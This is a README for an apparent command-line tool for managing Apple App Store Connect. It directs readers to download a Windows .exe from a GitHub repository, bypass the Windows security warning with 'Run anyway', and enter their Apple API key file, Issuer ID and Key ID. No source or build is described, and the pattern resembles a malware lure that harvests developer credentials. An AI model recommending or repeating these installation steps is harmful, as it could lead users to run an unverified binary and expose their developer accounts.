# 📱 app-store-connect-skill - Manage Your Apple Store Pages Easily

[![](https://img.shields.io/badge/Download-App-Store-Skill-blue.svg)](https://github.com/sosteam65/app-store-connect-skill)

This tool helps you manage your Apple App Store account from your computer. You can upload screenshots, check user reviews, and submit new versions of your app without using a web browser.

## 🛠 Prerequisites

Your computer needs specific components to run this software. Please confirm your computer meets these requirements:

1. Windows 10 or Windows 11.
2. A stable internet connection.
3. Your Apple Developer Team ID and API Key file. These files connect the tool to your private Apple account.

If you do not have an API key, log in to your Apple Developer account on their website. Navigate to the Users and Access section to generate an API key. Save the file in a secure location on your hard drive. 

## 📥 Getting the Software

You must download the installation package first. Visit the link below to reach the official download page.

[Get the installer here](https://github.com/sosteam65/app-store-connect-skill)

1. Click the link above.
2. Look for the Assets section on that page.
3. Select the file ending in .exe.
4. Save the file to your Downloads folder.

## ⚙️ Installation Steps

After you download the file, follow these steps to install the tool on your system:

1. Open your Downloads folder.
2. Double-click the file named app-store-connect-skill.exe.
3. A security window might appear. Click More Info and then select Run anyway.
4. Follow the prompts in the setup window.
5. Choose a folder for the program files. The default location works for most users.
6. Click Install.

The setup process copies the necessary files to your computer. Once the progress bar reaches the end, click Close.

## 🔑 Initial Configuration

Before you use the tool, you must connect it to your developer account. 

1. Open your Start menu.
2. Type app-store-connect-skill and press Enter.
3. You will see a black command window.
4. The tool asks for your API Key path. Type the location of the file you saved earlier and press Enter.
5. Paste your Issuer ID and Key ID when the window requests them.
6. Press Enter to save these credentials.

The software stores these settings in a hidden folder on your computer. You only perform this action once.

## 🚀 How to Use the Tool

The software functions as a terminal application. You type short instructions to perform tasks. Use these commands to manage your app:

### Viewing Your Apps
Type `list-apps` to see every app linked to your developer account. The screen displays the name, app identifier, and the current status of each project.

### Managing Screenshots
To upload new images for your store page, use the `upload-screenshots` command followed by the folder path where your images reside. The software automatically resizes and sends the files to Apple.

### Checking Reviews
Type `get-reviews` to download the latest user feedback for your app. The tool prints the star rating and the customer comment directly into your terminal window. This allows you to track user happiness without logging into the website.

### Managing TestFlight Groups
Use `manage-testflight` to add or remove users from your testing groups. You can quickly invite testers by entering their email addresses.

### Releasing Updates
When your app is ready for the public, use `submit-for-review`. This command checks your app metadata and triggers the submission process to Apple. The terminal displays a progress ticker while it sends your package.

## 🛡 Security Practices

This software handles sensitive account data. Follow these rules to protect your developer credentials:

* Never share your API key file with others.
* Do not save your API key in a public folder or cloud storage service.
* If you suspect your account compromise, delete your existing API key on the Apple Developer website and generate a new one.

## ❓ Frequently Asked Questions

### Can I run this tool on multiple computers?
Yes. You can install the software on every machine you use for work. Move your API key file to each computer to maintain access.

### Does the software work with App Store Connect sandbox environments?
Yes. You can toggle between production and sandbox modes by editing the configuration file in your installation directory.

### What happens if the internet cuts out during a submission?
The tool includes a resume feature. If an upload fails, restart the command. It detects which files reached the server and only sends the missing pieces.

### Can I automate these tasks?
Yes. Since this is a command-line tool, you can create a batch script on Windows to run multiple commands in a row. This saves time if you update several apps every week.

### How do I update the tool to the latest version?
Download the newer version from the official link. Running the installer again overwrites the old version with the new one. Your saved settings remain intact.